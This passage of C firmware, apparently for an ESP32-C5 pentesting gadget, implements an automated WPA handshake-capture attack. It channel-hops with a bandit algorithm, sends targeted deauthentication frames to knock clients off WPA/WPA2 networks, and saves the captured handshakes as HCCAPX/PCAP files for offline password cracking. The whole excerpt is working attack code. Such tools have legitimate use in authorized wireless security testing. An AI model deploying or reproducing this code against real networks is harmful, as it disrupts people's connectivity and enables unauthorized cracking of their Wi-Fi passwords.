brokali/projectZeroTouch/ESP32C5/main/main.c
        // Reset per-dwell counters
        hs_dwell_new_clients = 0;
        hs_dwell_eapol_frames = 0;
        
        // Dwell on this channel
        vTaskDelay(pdMS_TO_TICKS(HS_DWELL_TIME_MS));
        
        if (!handshake_attack_active || operation_stop_requested) break;
        
        // After dwell: process discovered clients for targeted deauth
        int64_t now = esp_timer_get_time();
        int deauth_count_this_dwell = 0;
        
        for (int i = 0; i < hs_client_count && handshake_attack_active; i++) {
            hs_client_entry_t *client = &hs_clients[i];
            if (client->hs_ap_index < 0 || client->hs_ap_index >= hs_ap_count) continue;
            
            hs_ap_target_t *ap = &hs_ap_targets[client->hs_ap_index];
            
            // Skip if AP already captured or has existing file
            if (ap->complete || ap->has_existing_file) continue;
            
            // Skip if AP is not on current channel
            if (ap->channel != channel) continue;
            
            // Skip if not WPA/WPA2
            if (ap->authmode == WIFI_AUTH_OPEN) continue;
            
            // Skip if client was recently deauthed (cooldown)
            if (client->last_deauth_us > 0 && 
                (now - client->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;
            
            // Send targeted deauth to this client
            // Tab5 parses: strstr(">>> [") && strstr("Attacking") with SSID in quotes
            MY_LOG_INFO(TAG, ">>> Attacking '%s' (Ch %d) - deauth %02X:%02X:%02X:%02X:%02X:%02X <<<",
                       ap->ssid, ap->channel,
                       client->mac[0], client->mac[1], client->mac[2],
                       client->mac[3], client->mac[4], client->mac[5]);
            
            {
                char hss_l2[64], hss_l3[64];
                snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
                snprintf(hss_l3, sizeof(hss_l3), "  Deauth %02X:%02X:%02X",
                         client->mac[3], client->mac[4], client->mac[5]);
                oled_display_update_full("> WPA Sniffer", hss_l2, hss_l3, "  Hunting...");
            }
            
            // Re-init HCCAPX serializer for this AP (so save works correctly)
            {
                size_t ssid_len = strlen(ap->ssid);
                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
            }
            
            hs_send_targeted_deauth(client->mac, ap->bssid, ap->channel);
            client->last_deauth_us = now;
            client->deauthed = true;
            ap->last_deauth_us = now;
            deauth_count_this_dwell++;
            
            // Limit deauths per dwell to avoid channel congestion
            if (deauth_count_this_dwell >= 3) break;
        }
        
        // If we deauthed someone, stay on this channel a bit longer to catch handshake
        if (deauth_count_this_dwell > 0) {
            vTaskDelay(pdMS_TO_TICKS(2000)); // 2s extra to catch reconnection
        }
        
        // Calculate D-UCB reward
        double reward = (double)hs_dwell_new_clients + 3.0 * (double)hs_dwell_eapol_frames;
        ducb_update(ch_idx, reward);
        
        // Check for completed handshakes and save
        for (int i = 0; i < hs_ap_count; i++) {
            hs_ap_target_t *ap = &hs_ap_targets[i];
            if (ap->complete && !ap->has_existing_file) {
                MY_LOG_INFO(TAG, "Saving complete handshake for '%s'...", ap->ssid);
                // Re-init HCCAPX for this AP before save
                size_t ssid_len = strlen(ap->ssid);
                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
                
                if (hs_save_handshake_to_sd(i)) {
                    ap->has_existing_file = true;
                    total_handshakes_captured++;
                    // Tab5 parses: strstr("Handshake #") && strstr("captured")
                    MY_LOG_INFO(TAG, "Handshake #%d captured! (APs: %d, Clients: %d)",
                               total_handshakes_captured, hs_ap_count, hs_client_count);
                    {
                        char hss_l2[64], hss_l4[64];
                        snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
                        snprintf(hss_l4, sizeof(hss_l4), "  >> Saved! #%d", total_handshakes_captured);
                        oled_display_update_full("> WPA Sniffer", hss_l2, "  Handshake OK!", hss_l4);
                    }
                    
                    // Re-init PCAP after save to free memory and start fresh
                    pcap_serializer_init();
                    // Re-capture beacons for remaining APs
                    for (int j = 0; j < hs_ap_count; j++) {
                        if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
                            hs_ap_targets[j].beacon_captured = false; // Will be re-captured
                        }
                    }
                } else {
                    // Tab5 parses: strstr("No handshake for")
                    MY_LOG_INFO(TAG, "No handshake for '%s' - save failed", ap->ssid);
                }
            }
        }
        
        // Periodic stats
        if ((now - last_stats_time) >= HS_STATS_INTERVAL_US) {
            int wpa_aps = 0, completed = 0, skipped = 0;
            for (int i = 0; i < hs_ap_count; i++) {
                if (hs_ap_targets[i].authmode != WIFI_AUTH_OPEN) wpa_aps++;
                if (hs_ap_targets[i].complete) completed++;
                if (hs_ap_targets[i].has_existing_file) skipped++;
            }
            
            // Find top D-UCB channel
            int top_ch = 0;
            int top_pulls = 0;
            for (int i = 0; i < ducb_channel_count; i++) {
                if (ducb_channels[i].total_pulls > top_pulls) {
                    top_pulls = ducb_channels[i].total_pulls;
                    top_ch = ducb_channels[i].channel;
                }
            }
            
            // Tab5 parses: strstr("Attacking") && strstr("networks...")
            MY_LOG_INFO(TAG, "Attacking %d networks... (WPA: %d, Clients: %d)", 
                       wpa_aps, wpa_aps, hs_client_count);
            // Tab5 parses: strstr("Networks attacked this cycle:") -> count after "cycle:"
            MY_LOG_INFO(TAG, "Networks attacked this cycle: %d", wpa_aps - skipped);
            // Tab5 parses: strstr("Handshakes captured so far:") -> count after "so far:"
            MY_LOG_INFO(TAG, "Handshakes captured so far: %d", completed);
            MY_LOG_INFO(TAG, "D-UCB best channel: %d (%d visits), current: Ch %d",
                       top_ch, top_pulls, channel);
            
            last_stats_time = now;
        }
    }
    
    // Disable promiscuous mode
    esp_wifi_set_promiscuous(false);
    
    // Tab5 parses: strstr("Attack Cycle Complete")
    MY_LOG_INFO(TAG, "===== Attack Cycle Complete =====");
    MY_LOG_INFO(TAG, "Total handshakes captured: %d", total_handshakes_captured);
    MY_LOG_INFO(TAG, "Sniffer mode stopped.");
}

// Handshake attack task - dispatches to selected or sniffer mode
static void handshake_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Handshake attack task started.");
    MY_LOG_INFO(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks" : "Sniffer + D-UCB");
    
    // Set LED to cyan for handshake attack
    esp_err_t led_err = led_set_color(0, 255, 255); // Cyan
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for handshake attack: %s", esp_err_to_name(led_err));
    }
    
    if (handshake_selected_mode) {
        handshake_attack_task_selected();
    } else {
        handshake_attack_task_sniffer();
    }
    
